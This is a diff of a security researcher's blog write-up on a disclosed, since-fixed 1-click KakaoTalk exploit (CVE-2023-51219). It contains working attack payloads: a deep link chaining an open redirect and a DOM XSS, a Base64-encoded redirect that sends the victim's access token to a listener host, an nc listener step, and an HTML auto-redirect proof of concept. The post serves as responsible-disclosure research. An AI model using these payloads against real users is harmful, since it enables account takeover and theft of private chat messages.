@@ -1,7 +1,7 @@
 ---
 title: "1-click Exploit in South Korea's biggest mobile chat app"
 date: 2024-05-31T14:04:20+02:00
-lastmod: 2024-05-31T14:04:20+02:00
+lastmod: 2024-06-23T14:04:20+02:00
 author: "stulle123"
 summary: "Stealing another KakaoTalk user's chat messages with a simple 1-click exploit."
 tags: 
@@ -30,11 +30,11 @@ First things first: [PoC||GTFO](#poc)
 </video>
 {{< /rawhtml >}}
 
-A deep link validation issue in KakaoTalk `10.4.3` allows a remote adversary to run any attacker-controlled JavaScript within a WebView. By running JavaScript, another non-exported WebView can be reached that leaks its access token in a HTTP request header. Ultimately, this access token can be used to takeover another user's account and read her/his chat messages by registering an attacker-controlled device. This bug got assigned with [CVE-2023-51219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51219). We also release our [tooling](https://github.com/stulle123/kakaotalk_analysis) so that fellow security researchers can dig into KakaoTalk's broad attack surface to find more bugs.
+A deep link validation issue in KakaoTalk `10.4.3` allows a remote adversary to run arbitrary JavaScript in a WebView that leaks an access token in a HTTP request header. Ultimately, this token can be used to takeover another user's account and read her/his chat messages by registering an attacker-controlled device. This bug got assigned with [CVE-2023-51219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51219). We also release our [tooling](https://github.com/stulle123/kakaotalk_analysis) so that fellow security researchers can dig into KakaoTalk's broad attack surface to find more bugs.
 
 ## Context
 
-With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea's most popular chat app. Similar to apps such as WeChat, KakaoTalk is an "all-in" app including everyhing into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called "Secure Chat" but it doesn't support features such as group messaging or voice calling.
+With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea's most popular chat app. Similar to apps such as WeChat, KakaoTalk is an "all-in" app including everything into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called "Secure Chat" but it doesn't support features such as group messaging or voice calling.
 
 ## Entry Point: CommerceBuyActivity
 
@@ -42,10 +42,18 @@ The `CommerceBuyActivity` WebView is the main entry point and very interesting f
 
 - It's exported and can be started with a deep link (e.g., `adb shell am start kakaotalk://buy`)
 - It has JavaScript enabled (`settings.setJavaScriptEnabled(true);`)
-- It supports the `intent://` [scheme](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf) to send data to other (non-exported) app components via JavaScript. For example, the URI `"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"` loads the website `https://foo.bar` in the `MyProfileSettingsActivity` WebView.
+- It supports the `intent://` [scheme](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf) to send data to other **non-exported** app components via JavaScript. For example, the URI `"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"` loads the website `https://foo.bar` in the `MyProfileSettingsActivity` WebView.
 - There's no sanitization of `intent://` URIs (e.g., the `Component` or `Selector` is **not** set to `null`). So, potentially any app component can be accessed.
 
-This means that if we find a way to run our own JavaScript inside the `CommerceBuyActivity` we would have the ability to start arbitrary (non-exported) app components when the user clicks on a malicious `kakaotalk://buy` deep link.
+Additionally, it leaks an access token in the `Authorization` HTTP header. Here's a simple way to reproduce this behavior:
+
+- Start a Netcat listener in a terminal window: `$ nc -l 5555`
+- Run `$ adb shell am start kakaotalk://buy` to start the `CommerceBuyActivity` WebView
+- Since `WebView.setWebContentsDebuggingEnabled(true);` you can use `chrome://inspect` in Chrome to debug it
+- Go to the `Console` tab and enter `document.location="http://<your-IP-address>:5555/";`
+- You should see a GET request and the `Authorization` header
+
+This means that if we find a way to run our own JavaScript inside the `CommerceBuyActivity` we would have the ability to steal the user's access token and to start arbitrary app components when the user clicks on a malicious `kakaotalk://buy` deep link.
 
 Unfortunately, we can't load arbitrary attacker-controlled URLs as there is some validation going on:
 
@@ -96,7 +104,7 @@ public final String m17260P5(Uri uri) {
 
 If you take a look at the code you'll recognize that we control the path, query parameters and fragment of the URL. However, everything is prefixed with the String `m36725d` which is `https://buy.kakao.com` in our case. That means if a user clicks on the deep link `kakaotalk://buy/foo` the URL `https://buy.kakao.com/foo` gets loaded in the `CommerceBuyActivity` WebView.
 
-Maybe there's an Open Redirect or XSS issue on `https://buy.kakao.com` so that we can run JavaScript? 🤔
+Maybe there's an Open Redirect or XSS issue on `https://buy.kakao.com` so that we can run JavaScript? :thinking:
 
 ## URL Redirect to DOM XSS
 
@@ -106,81 +114,24 @@ To find a vulnerable website we just googled for `site:*.kakao.com inurl:search 
 
 Funnily enough, there was already a Stored XSS as `https://m.shoppinghow.kakao.com/m/search/q/alert(1)` popped up an alert box. Searching the DOM brought up the responsible Stored XSS payload `[해외]test "><svg/onload=alert(1);// Pullover Hoodie`. **Edit:** As of May 2024 this seems to be fixed.
 
-Continuing to browse the DOM we discovered another [endpoint](https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:foo) where the search query was passed to a `innerHTML` sink (see [DOM Invader notes](#dom-xss)). Eventually, the PoC XSS payload turned out to be as simple as `"><img src=x onerror=alert(1);>`.
+Continuing to browse the DOM we discovered another [endpoint](https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:foo) where the search query was passed to a `innerHTML` sink (see [DOM Invader notes](https://github.com/stulle123/kakaotalk_analysis/blob/main/doc/ACCOUNT_TAKEOVER.md#dom-xss)). Eventually, the PoC XSS payload turned out to be as simple as `"><img src=x onerror=alert(1);>`.
 
 At this point we could run arbitrary JavaScript in the `CommerceBuyActivity` WebView when the user clicked on a deep link such as `kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:"><img src=x onerror=alert(1);>`.
 
-Since the `CommerceBuyActivity` supports the `intent://` scheme we could now start arbitrary non-exported app components 🥳
+As explained [above](#entry-point-commercebuyactivity), `CommerceBuyActivity` leaks the user's access token in the `Authorization` header.
 
-## MyProfileSettingsActivity
+What could we do with this token? Maybe take over a victim’s KakaoTalk account? :relieved:
 
-Digging further, we identified the non-exported `MyProfileSettingsActivity` WebView which had a couple of issues, too.
-
-First off, it allowed loading of arbitrary URLs:
-
-```java
-public final void onCreate(Bundle bundle) {
-    String str;
-    super.onCreate(bundle);
-    String str2 = null;
-
-    // Here the URL can be passed to MyProfileSettingsActivity via an intent
-    if (getIntent().hasExtra("EXTRA_URL")) {
-        str = getIntent().getStringExtra("EXTRA_URL");
-    } else {
-        str = null;
-    }
-    
-    if (getIntent().hasExtra("EXTRA_TITLE")) {
-        str2 = getIntent().getStringExtra("EXTRA_TITLE");
-    }
-
-    WebSettings settings = this.f192507q.getSettings();
-    settings.setJavaScriptEnabled(true);
-    settings.setSupportZoom(true);
-    settings.setBuiltInZoomControls(true);
-    settings.setJavaScriptCanOpenWindowsAutomatically(true);
-    WebViewHelper.Companion companion = WebViewHelper.INSTANCE;
-    companion.getInstance().appendKakaoTalkToUserAgentString(settings);
-    this.f192507q.setWebViewClient(new C8206a());
-    this.f192507q.setWebChromeClient(new C8207b(this.f192508r));
-    this.f192507q.setDownloadListener(new C34313v1(this, 0));
-    
-    if (str2 != null) {
-        setTitle(str2);
-    }
-    
-    if (str == null) {
-        str = C24983v.m36731j(C47684e.f174774b, "android/adid/manage.html");
-    }
-    
-    WebView webView = this.f192507q;
-    HashMap m16559U5 = m16559U5();
-
-    // URL host validation is broken. In fact, any URL can be loaded.
-    if (C55281p.m61314a0(C47684e.f174709D0, Uri.parse(str).getHost(), true)) {
-        m16559U5.putAll(companion.getInstance().getBreweryHeader());
-    }
-
-    C52084x c52084x = C52084x.f192756a;
-
-    // Finally, the URL is loaded.
-    webView.loadUrl(str, m16559U5);
-}
-```
-
-This included `javascript://` and `data://` schemes which allow to run JavaScript. Also, it supported `content://` URLs, so a URL such as `content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json` opens KakaoTalk's Firebase Installation configuration in the `MyProfileSettingsActivity` WebView.
-
-Additionally, it leaked an access token in the `Authorization` HTTP header. For example, a command such as `adb shell am start "intent:#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=https://foo.bar\;end"` would send the token to `https://foo.bar`.
-
-What could we do with this token? Maybe take over a victim's KakaoTalk account?
+{{< box info >}}
+Btw, we could also start arbitrary non-exported app components since `CommerceBuyActivity` supports the `intent://` scheme.
+{{< /box >}}
 
 ## Deep Link to Kakao Mail Account Takeover
 
-As explained in the previous section the `MyProfileSettingsActivity` is not exported, but we could start it via `CommerceBuyActivity` with the trick explained above. By crafting a malicious deep link, we could send the access token to an attacker-controlled server:
+As explained in the previous section, we can steal the user's access token by running arbitrary JS in the `CommerceBuyActivity` WebView. By crafting a malicious deep link, we could send the token to an attacker-controlled server:
 
 ```
-kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw=');">
+kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv');">
 ```
 
 Let's break it down:
@@ -188,11 +139,13 @@ Let's break it down:
 - `kakaotalk://buy` fires up `CommerceBuyActivity`
 - `/auth/0/cleanFrontRedirect?returnUrl=` "compiles" to `https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=` and redirects to any `kakao.com` domain
 - `https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:` had the XSS issue
-- `"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw=');">` is the XSS payload. We had to Base64 encode the "attacker URL" to bypass some sanitization checks.
+- `"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv');">` is the XSS payload. We had to Base64 encode `http://192.168.178.20:5555/` to bypass some sanitization checks.
 
 Now, in possession of the access token what could we do with it? Well, how about we use it to take over the victim's Kakao Mail account that was used for KakaoTalk registration!
 
-> **_NOTE:_** If the victim doesn't have a Kakao Mail account it's possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user's previous registered email-address with no additional checks. Scroll to the end of this section to check out how to do that.
+{{< box info >}}
+If the victim doesn't have a Kakao Mail account it's possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user's previous registered email-address with no additional checks. Scroll to the end of this section to check out how to do that.
+{{< /box >}}
 
 First, we needed to check if the victim actually uses Kakao Mail:
 
@@ -320,7 +273,7 @@ First, she/he stores the payload to a file, ...
 
 ```javascript
 <script>
-location.href = decodeURIComponent("kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFrontRedirect%3FreturnUrl%3Dhttps%3A%2F%2Fm.shoppinghow.kakao.com%2Fm%2Fproduct%2FQ24620753380%2Fq%3A%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3Datob%28%27aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw%3D%27%29%3B%22%3E");
+location.href = decodeURIComponent("kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFrontRedirect%3FreturnUrl%3Dhttps%3A%2F%2Fm.shoppinghow.kakao.com%2Fm%2Fproduct%2FQ24620753380%2Fq%3A%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3Datob%28%27aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv%27%29%3B%22%3E");
 </script>
 ```
 
@@ -391,7 +344,7 @@ Example response:
 {"status":0,"isVerified":true,"passcode":"8825"}
 ```
 
-And we're in! Profit 🥳🥳🥳
+And we're in! Profit :partying_face: :partying_face: :partying_face:
 
 {{< rawhtml >}} 
 <video width=100% controls>
@@ -407,4 +360,6 @@ And we're in! Profit 🥳🥳🥳
 
 ## Responsible Disclosure
 
-We reported this vulnerability in December 2023 via [Kakao's Bug Bounty Program](https://bugbounty.kakao.com/). However, we didn't receive any reward as only Koreans are eligible to receive a bounty 🤯 The issues were fixed (see [correspondence](https://github.com/stulle123/kakaotalk_analysis/tree/main/report)).
+We reported this vulnerability in December 2023 via [Kakao's Bug Bounty Program](https://bugbounty.kakao.com/). However, we didn't receive any reward as only Koreans are eligible to receive a bounty :exploding_head:
+
+As an immediate fix, Kakao Corp. took down `https://buy.kakao.com` and removed the `/auth/0/cleanFrontRedirect?returnUrl=` redirect. The vulnerable `CommerceBuyActivity` was removed in later versions (see [correspondence](https://github.com/stulle123/kakaotalk_analysis/tree/main/report)).
